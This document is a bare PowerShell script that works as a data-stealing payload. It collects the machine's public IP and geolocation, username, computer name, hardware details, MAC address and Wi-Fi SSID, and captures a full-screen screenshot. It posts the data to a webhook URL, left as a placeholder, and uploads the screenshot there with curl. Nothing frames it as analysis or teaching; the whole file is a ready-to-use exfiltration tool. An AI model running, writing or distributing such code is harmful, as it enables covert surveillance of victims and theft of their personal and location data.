$ip = (Invoke-RestMethod -Uri "https://api.ipify.org")

$geo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
$city = $geo.city
$region = $geo.region
$country = $geo.country

$usr = $env:USERNAME
$hostname = $env:COMPUTERNAME

$cpu = (Get-CimInstance Win32_Processor).Name
$gpu = (Get-CimInstance Win32_VideoController).Name
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

$mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
$ssid = (netsh wlan show interfaces) -match 'SSID' | Select-Object -First 1

$webhookUrl = " WEBHOOK URL "

$output = @{
    content = 
    "
    IP: $ip
    Location: $city, $region, $country
    Name: $usr
    PC Name: $hostname
    CPU: $cpu
    GPU: $gpu
    RAM: $ram
    MAC Address: $mac
    SSID: $ssid
    "
} | ConvertTo-Json

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
$screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
$screenLeft = [System.Windows.Forms.SystemInformation]::VirtualScreen.Left
$screenTop = [System.Windows.Forms.SystemInformation]::VirtualScreen.Top

$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight

$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screenLeft, $screenTop, 0, 0, $bitmap.Size)

$bitmap.Save("$env:TEMP\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)

$graphics.Dispose()
$bitmap.Dispose()

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $output -ContentType "application/json"
curl.exe -F "file=@$env:TEMP\screenshot.png" "$webhookUrl"
